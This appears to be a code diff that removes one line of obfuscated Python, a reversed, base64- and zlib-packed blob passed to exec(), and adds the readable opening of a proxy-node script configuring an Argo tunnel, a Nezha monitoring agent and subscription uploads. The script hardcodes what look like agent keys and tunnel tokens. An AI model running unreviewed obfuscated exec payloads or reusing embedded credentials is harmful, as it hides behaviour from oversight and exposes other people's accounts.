@@ -1,1 +1,361 @@
-_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('==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'))
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import os
+import sys
+import re
+import json
+import time
+import base64
+import random
+import string
+import shutil
+import asyncio
+import platform
+import signal
+import threading
+import subprocess
+import datetime
+import traceback
+import requests
+from pathlib import Path
+from urllib.parse import urlparse, quote
+from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
+from cryptography.hazmat.primitives.asymmetric import x25519, ec
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+
+# =========================== 环境变量 ===========================
+UPLOAD_URL = os.environ.get('UPLOAD_URL', '')          # 节点或订阅上传地址
+PROJECT_URL = os.environ.get('PROJECT_URL', '')        # 项目url,用于自动保活或上传订阅
+AUTO_ACCESS = os.environ.get('AUTO_ACCESS', '').lower() == 'true'  # true开启自动保活,默认关闭
+FILE_PATH_ENV = os.environ.get('FILE_PATH', '.cache')      # 运行目录,sub.txt保存路径
+SUB_PATH = os.environ.get('SUB_PATH', 'sub')           # 订阅token
+UUID = os.environ.get('UUID', 'ecc6fe55-232a-4767-aeb7-6aebc629b56e')  # UUID
+NEZHA_SERVER = os.environ.get('NEZHA_SERVER', 'vps.1492.eu.org')      # 哪吒面板域名
+NEZHA_PORT = os.environ.get('NEZHA_PORT', '443')          # v1留空, v0填agent通信端口
+NEZHA_KEY = os.environ.get('NEZHA_KEY', '7KLu5nbNsibi1swkzA')            # v1的NZ_CLIENT_SECRET或v0 agent密钥
+ARGO_DOMAIN = os.environ.get('ARGO_DOMAIN', 'abasthan.1862.eu.org')        # Argo固定隧道域名
+ARGO_AUTH = os.environ.get('ARGO_AUTH', 'eyJhIjoiMGUzYzZkNmU3ODEwZjQyZTlhMGRiYjQxYWZhNjQwZGUiLCJ0IjoiMTZjMzU1MTQtYjA1Zi00NTI4LTkwZWYtY2QwMmZjNzA2YzUxIiwicyI6IllqY3pORGMzTnpJdFlUYzNNQzAwT1RFMExXRmpOR1V0TXpBME9UTXdaakpqT0RoaCJ9')            # Argo固定隧道token或json
+ARGO_PORT = int(os.environ.get('ARGO_PORT', '8001'))   # Argo隧道端口
+S5_PORT = os.environ.get('S5_PORT', '')                # socks5端口
+HY2_PORT = os.environ.get('HY2_PORT', '')              # hy2端口
+REALITY_PORT = os.environ.get('REALITY_PORT', '')      # reality端口
+CFIP = os.environ.get('CFIP', 'store.ubi.com')         # 优选ip或域名
+CFPORT = int(os.environ.get('CFPORT', '443'))          # 优选端口
+NAME = os.environ.get('NAME', 'Abasthan')                      # 节点名称
+CHAT_ID = os.environ.get('CHAT_ID', '')                # Telegram chat_id
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '')            # Telegram bot_token
+# 改进端口获取逻辑
+raw_port = os.environ.get('PORT')
+if raw_port:
+    try:
+        # 处理可能带有 /tcp 的端口字符串
+        PORT = int(re.search(r'\d+', raw_port).group())
+    except:
+        PORT = 3000
+else:
+    PORT = 3000
+
+# 强制开启日志以方便排查
+SHOW_LOG = True 
+
+# =========================== 日志控制 ===========================
+def log(msg):
+    print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")
